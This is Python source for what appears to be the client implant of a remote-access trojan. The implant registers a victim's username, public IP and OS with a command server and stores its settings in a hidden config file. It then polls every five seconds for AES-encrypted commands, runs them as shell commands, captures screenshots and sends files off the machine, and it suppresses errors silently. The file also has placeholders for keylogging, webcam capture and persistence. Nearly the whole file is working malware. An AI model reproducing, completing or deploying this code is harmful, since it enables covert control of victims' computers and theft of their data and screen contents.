import requests
import subprocess
import time
import platform
import os
import json
import mss
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
from Crypto.Random import get_random_bytes
import base64

# Track the current working directory (starting with the root or default directory)
current_directory = os.path.expanduser("~")
SERVER_URL = "https://localhost:5000"  # Change to your actual server URL later

CONFIG_FILE_LINUX = "/tmp/.rootconfig.ini"  # Path in Linux root directory
CONFIG_FILE_WINDOWS = os.path.join(os.path.expanduser("~"), "rootconfig.ini")  # User's home directory on Windows

# Function to get the username using `whoami` (works on both Windows and Linux)
def get_username():
    try:
        username = subprocess.check_output("whoami", shell=True).decode().strip()
        return username
    except Exception as e:
        print(f"Error retrieving username: {e}")
        return None

# Function to get the public IP address
def get_public_ip():
    try:
        # Use an external API to get the public IP address
        response = requests.get("https://api.ipify.org?format=json")
        if response.status_code == 200:
            public_ip = response.json().get("ip")
            return public_ip
        else:
            print("Failed to get public IP")
            return None
    except Exception as e:
        print(f"Error retrieving public IP: {e}")
        return None

# Function to check if the server URL is active
def is_server_url_active(url):
    try:
        response = requests.get(url, timeout=5, verify='cert.pem')
        if response.status_code == 200:
            print("Server is active and reachable.")
            return True
        else:
            print(f"Server responded with status code: {response.status_code}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"Error connecting to server: {e}")
        return False

# Function to check if the configuration file exists based on the OS
def check_config_file():
    if platform.system() == "Linux":
        return os.path.exists(CONFIG_FILE_LINUX)
    elif platform.system() == "Windows":
        return os.path.exists(CONFIG_FILE_WINDOWS)
    else:
        return False

# Check and register the client if necessary
def check_and_register_client():
    # Check if the server is active (reachable)
    while not is_server_url_active(SERVER_URL):
        print(f"Server at {SERVER_URL} is not active. Retrying in 1 minute...")
        time.sleep(2)  # Wait for 1 minute before retrying

    print(f"Server at {SERVER_URL} is now active. Proceeding with registration...")

    # Check if the config file exists based on OS
    if check_config_file():
        config_file = CONFIG_FILE_LINUX if platform.system() == "Linux" else CONFIG_FILE_WINDOWS
        with open(config_file, 'r') as file:
            data = json.load(file)
            return data.get("client_id")
    else:
        # File is missing or empty, so register with the server
        return register_client()

# Register the client and get a client_id from the server
def register_client():
    # Get client details (user, public IP, OS)
    user = get_username()  # Get the username using whoami
    public_ip = get_public_ip()
    os_name = os.uname().sysname if platform.system() != "Windows" else platform.system()

    if not user or not public_ip:
        print("Error: Could not retrieve necessary information.")
        return None

    # Send registration request to the server
    registration_data = {
        'user': user,
        'public_ip': public_ip,
        'os': os_name
    }

    try:
        # Send a POST request to the /clientRegistration endpoint
        response = requests.post(f"{SERVER_URL}/api/clientRegistration", json=registration_data, verify='cert.pem')

        if response.status_code == 201:
            # Server response contains the client_id and public_key
            client_data = response.json()
            client_id = client_data.get("client_id")
            public_key = client_data.get("public_key")  # Extract the RSA public key

            if not client_id or not public_key:
                print("Error: Server response missing client_id or public_key.")
                return None

            # Save both client_id and public_key to the config file based on OS
            config_file = CONFIG_FILE_LINUX if platform.system() == "Linux" else CONFIG_FILE_WINDOWS
            with open(config_file, 'w') as file:
                json.dump({"client_id": client_id, "public_key": public_key}, file)

            print(f"Registered with client_id: {client_id} and saved server's public key.")
            return client_id  # Return client_id for immediate use
        else:
            print(f"Registration failed. Status Code: {response.status_code}")
            return None
    except Exception as e:
        print(f"Error during registration: {e}")
        return None
    
# Start the check-and-register process
client_id = check_and_register_client()

if client_id:
    print(f"Client registered with ID: {client_id}")
else:
    print("Client registration failed.")

def aes_session_key_function(client_id, SERVER_URL, cert_path="cert.pem"):
    """
    Generate an AES session key, prepare a payload with client_id and AES key,
    encrypt the entire payload with the server's RSA public key, and send it to
    the /api/aes-share endpoint.
    
    Args:
        client_id (str): The client's unique ID from registration.
        SERVER_URL (str): The base URL of the server (default: https://localhost:5000).
        cert_path (str): Path to the server's SSL certificate for verification (default: cert.pem).
    
    Returns:
        bytes: The generated AES key if successful, None if failed.
    """
    try:
        # Step 1: Load the server's RSA public key from the config file
        config_file = CONFIG_FILE_LINUX if platform.system() == "Linux" else CONFIG_FILE_WINDOWS
        print(f"Loading config file from: {config_file}")
        with open(config_file, 'r') as file:
            config_data = json.load(file)
            server_public_key_pem = config_data.get("public_key")
        
        if not server_public_key_pem:
            print("Error: Server public key not found in config file.")
            return None
        
        # Step 2: Import the RSA public key
        print("Importing server's RSA public key")
        server_public_key = RSA.import_key(server_public_key_pem)
        
        # Step 3: Generate a 256-bit AES session key
        print("Generating 256-bit AES session key")
        aes_key = get_random_bytes(32)  # 32 bytes = 256 bits
        
        # Step 4: Prepare the JSON payload
        payload = {
            "client_id": client_id,
            "aes_key": aes_key.hex()  # Store AES key as hex in payload
        }
        payload_json = json.dumps(payload)  # Serialize to JSON string
        payload_bytes = payload_json.encode('utf-8')  # Convert to bytes
        print(f"Prepared payload (JSON): {payload_json}")
        print(f"Payload size: {len(payload_bytes)} bytes")

        # Step 5: Check RSA encryption size limit
        rsa_key_size = server_public_key.size_in_bytes()  # e.g., 256 bytes for 2048-bit key
        max_data_size = rsa_key_size - 42  # OAEP padding overhead (approx 42 bytes)
        if len(payload_bytes) > max_data_size:
            print(f"Error: Payload size ({len(payload_bytes)} bytes) exceeds RSA limit ({max_data_size} bytes)")
            return None

        # Step 6: Encrypt the entire payload with the server's RSA public key
        print("Encrypting entire payload with RSA public key")
        cipher_rsa = PKCS1_OAEP.new(server_public_key)
        encrypted_payload = cipher_rsa.encrypt(payload_bytes)
        print(f"Encrypted payload (first 10 bytes): {encrypted_payload[:10].hex()}...")

        # Step 7: Send the encrypted payload to the /api/aes-share endpoint
        endpoint = f"{SERVER_URL}/api/aes-share"
        print(f"Sending POST request to {endpoint}")
        response = requests.post(
            endpoint,
            json={"encrypted_payload": encrypted_payload.hex()},  # Send as hex string
            verify=cert_path,
            timeout=5
        )
        
        # Step 8: Check the response
        if response.status_code == 200:
            print("Encrypted payload successfully shared with server")
            return aes_key  # Return the AES key for local use
        else:
            print(f"Failed to share encrypted payload. Status code: {response.status_code}, Response: {response.text}")
            return None
            
    except Exception as e:
        print(f"Error in aes_session_key_function: {e}")
        return None

# Example usage (after registration):
aes_key = aes_session_key_function(client_id,SERVER_URL)
if aes_key:
    print(f"AES session key generated and shared: {aes_key.hex()}")

def encrypt_data(aes_key, data):
    """
    Encrypt data (text or file) using AES-GCM with the provided AES key.
    
    Args:
        aes_key (bytes): The 256-bit AES key.
        data (str or bytes): The data to encrypt (string for text, bytes for files).
    
    Returns:
        dict: Dictionary with nonce, ciphertext, and tag (all hex-encoded), or None if failed.
    """
    try:
        # Convert input to bytes
        if isinstance(data, str):
            data_bytes = data.encode('utf-8')
        elif isinstance(data, bytes):
            data_bytes = data
        else:
            raise ValueError("Data must be string or bytes")

        # Generate a 12-byte nonce for AES-GCM
        nonce = get_random_bytes(12)

        # Create AES-GCM cipher and encrypt
        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
        ciphertext, tag = cipher.encrypt_and_digest(data_bytes)

        # Return hex-encoded values for JSON compatibility
        return {
            "nonce": nonce.hex(),
            "ciphertext": ciphertext.hex(),
            "tag": tag.hex()
        }
    except Exception as e:
        print(f"Error in encrypt_data: {e}")
        return None


def decrypt_data(aes_key, nonce_hex, ciphertext_hex, tag_hex):
    """
    Decrypt data (text or file) encrypted with AES-GCM using the provided AES key.
    
    Args:
        aes_key (bytes): The 256-bit AES key.
        nonce_hex (str): The hex-encoded nonce from encryption.
        ciphertext_hex (str): The hex-encoded ciphertext from encryption.
        tag_hex (str): The hex-encoded authentication tag from encryption.
    
    Returns:
        bytes: Decrypted data (bytes, caller can decode to string for text), or None if failed.
    """
    try:
        # Convert hex strings to bytes
        nonce = bytes.fromhex(nonce_hex)
        ciphertext = bytes.fromhex(ciphertext_hex)
        tag = bytes.fromhex(tag_hex)

        # Create AES-GCM cipher and decrypt
        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
        plaintext_bytes = cipher.decrypt_and_verify(ciphertext, tag)

        return plaintext_bytes
    except Exception as e:
        print(f"Error in decrypt_data: {e}")
        return None

def execute_command(command):
    """Execute the shell command, update current directory if 'cd' command is issued."""
    global current_directory
    try:
        # If the command is 'cd', update the current directory
        if command.startswith("cd "):
            # Extract the directory path from the command
            new_directory = command[3:].strip()
            # If it's an absolute path, use it directly; otherwise, make it relative
            if new_directory.startswith("/"):
                current_directory = new_directory
            else:
                current_directory = os.path.join(current_directory, new_directory)
            return f"Changed directory to {current_directory}"

        # For other commands, execute them in the current directory
        result = subprocess.run(command, shell=True, cwd=current_directory, text=True, capture_output=True)

        # Return the output or error if any
        if result.returncode == 0:
            return result.stdout
        else:
            return result.stderr
    except subprocess.CalledProcessError as e:
        return f"Error: {e.output}"

def process_json_command(decrypted_text_ready_to_convert_to_json):
    try:
        # Detect and fix nested JSON structure if needed
        if isinstance(decrypted_text_ready_to_convert_to_json, str):
            # Try parsing directly
            try:
                parsed_data = json.loads(decrypted_text_ready_to_convert_to_json)
            except json.JSONDecodeError:
                # If parsing fails, attempt to clean and fix malformed structure
                fixed_data = decrypted_text_ready_to_convert_to_json.replace('"{', '{').replace('}"', '}')
                parsed_data = json.loads(fixed_data)

        else:
            parsed_data = decrypted_text_ready_to_convert_to_json

        # Handle both nested and simple structures
        if isinstance(parsed_data, dict):
            for key, value in parsed_data.items():
                if isinstance(value, str):
                    try:
                        # Try parsing inner JSON
                        inner_data = json.loads(value)
                        # Handle nested JSON with specific fields
                        if all(field in inner_data for field in ["upload_type", "client_id", "filename"]):
                            print(f"Upload Type: {inner_data['upload_type']}")
                            print(f"Client ID: {inner_data['client_id']}")
                            print(f"Filename: {inner_data['filename']}")
                        else:
                            # Handle other key-value structures
                            print(f"Key: {key}")
                            print(f"Value: {value}")
                    except json.JSONDecodeError:
                        # Handle simple key-value pairs
                        return value
                else:
                    return value
        else:
            print("Unexpected JSON structure")

    except Exception as e:
        print("An error occurred:", e)


def get_file_as_response_from_server_and_decrypt_and_save(filename,file_path, file_content):
    base64_decoded_file_content = base64.b64decode(file_content).decode()
    base64_decoded_in_json = json.loads(base64_decoded_file_content)
    try:
        decrypted_data = decrypt_data(aes_key,base64_decoded_in_json.get("nonce"),base64_decoded_in_json.get("ciphertext"),base64_decoded_in_json.get("tag"))
        with open(file_path, "wb") as file:
            file.write(decrypted_data)
            print(f"[+] File '{filename}' saved successfully in {current_directory}")
    except Exception as e:
        print(e)


while True:
    try:
        # Fetch command from the server every 5 seconds
        response = requests.get(f"{SERVER_URL}/command-transmission-to-client?clientID={client_id}", timeout=5, verify='cert.pem')  # Set timeout for the request
        
        # Check if the response status is OK
        if response.status_code == 200:
            # Decode the Base64 response text
            decoded_data = base64.b64decode(response.text).decode('utf-8')
            # Convert the decoded string back to a dictionary
            data = json.loads(decoded_data)
            # Extract the nonce, ciphertext, and tag
            nonce_hex = data["nonce"]
            ciphertext_hex = data["ciphertext"]
            tag_hex = data["tag"]

            # Call decrypt_data function with aes_key and the extracted values
            decrypted_text = decrypt_data(aes_key, nonce_hex, ciphertext_hex, tag_hex).decode("utf-8")
            decrypted_text_ready_to_convert_to_json = decrypted_text.replace("'", '"')

            command_after_json_processing = process_json_command(decrypted_text_ready_to_convert_to_json)
            command = f"{command_after_json_processing}"
            
            if command == "screenshot":
                with mss.mss() as sct:
                    screenshot = sct.grab(sct.monitors[1])  # Capture the primary monitor
                    response = requests.post(f"{SERVER_URL}/api/screenshot", files={"file": ("screenshot.png", mss.tools.to_png(screenshot.rgb, screenshot.size))},data={"client_id": client_id}  # Include client_id in the request
                , verify='cert.pem')
                print(response.text)  # Print the API response
                command = ""
            elif command.strip == "start_keylog":
                pass
            elif command.strip == "stop_keylog":
                pass
            elif command.strip == "photo":
                pass

            
            elif command.startswith("{'upload_type': 'UploadFromFiles'"):
                client_id = command_after_json_processing["client_id"]
                filename = command_after_json_processing["filename"]
                command=""
                command_after_json_processing=""
                # Send request to server
                response = requests.get(f"{SERVER_URL}/api/upload-file-to-client?clientID={client_id}&filename={filename}", timeout=5, verify='cert.pem')

                # Check if the response is successful
                if response.status_code == 200:
                    file_path = os.path.join(current_directory, filename)
                    # Save the file
                    get_file_as_response_from_server_and_decrypt_and_save(filename,file_path,response.content)
                    
                else:
                    print(f"Failed to download file. Server responded with status code {response.status_code}")


            elif command.startswith("{'command': 'UploadFromServer'"):
                client_id = command_after_json_processing["client_id"]
                server_file_path_for_client = command_after_json_processing["server_file_path"]
                command=""
                command_after_json_processing=""

                response = requests.get(f"{SERVER_URL}/api/upload-file-to-client?clientID={client_id}&server_file_path_from_client={server_file_path_for_client}", timeout=5, verify='cert.pem')
                # Check if the response is successful
                if response.status_code == 200:
                    filename = os.path.basename(server_file_path_for_client)
                    file_path = os.path.join(current_directory, filename)
                    get_file_as_response_from_server_and_decrypt_and_save(filename,file_path,response.content)
                    
                    
                else:
                    print(f"Failed to download file. Server responded with status code {response.status_code}")


                
            elif command.startswith("download"):
                _, file_path = command.split(" ", 1)
                full_file_path = os.path.join(current_directory,file_path)
                if os.path.exists(full_file_path):
                    print(full_file_path)
                try:
                    with open(full_file_path, 'rb') as file:
                        files = {'file': (os.path.basename(full_file_path), file)}
                        response = requests.post(f'{SERVER_URL}/api/download-files-from-client', files=files, verify='cert.pem')
                        print(response.text)
                except Exception as e:
                    print(f"Error sending file: {e}")
                command = ""
            elif command.strip == "persist":
                pass
            elif command.strip == "change_key":
                pass
            else:
                
                result = {"command":command, "result": execute_command(command), "client_id":client_id}
                print(result)
                encrypted_result_dictionary = encrypt_data(aes_key,f"{result}")
                encrypted_result_dictionary = json.dumps(encrypted_result_dictionary)
                # Encode the JSON string in Base64
                encrypted_and_b64_encoded_result = base64.b64encode(encrypted_result_dictionary.encode('utf-8')).decode('utf-8')
                print(encrypted_and_b64_encoded_result)
                result_response = requests.post(f"{SERVER_URL}/execution-result-of-command-from-client?clientID={client_id}", data=encrypted_and_b64_encoded_result, verify='cert.pem')
                
                # Check if the result was successfully sent
                if result_response.status_code != 200:
                    pass  # Do nothing on failure
        else:
            pass  # Do nothing if no command or bad status response from server

    except (requests.exceptions.RequestException, Exception):
        # Handle any error (like server down, no response, or timeout) silently
        pass
    
    # Wait for 5 seconds before the next request
    time.sleep(5)
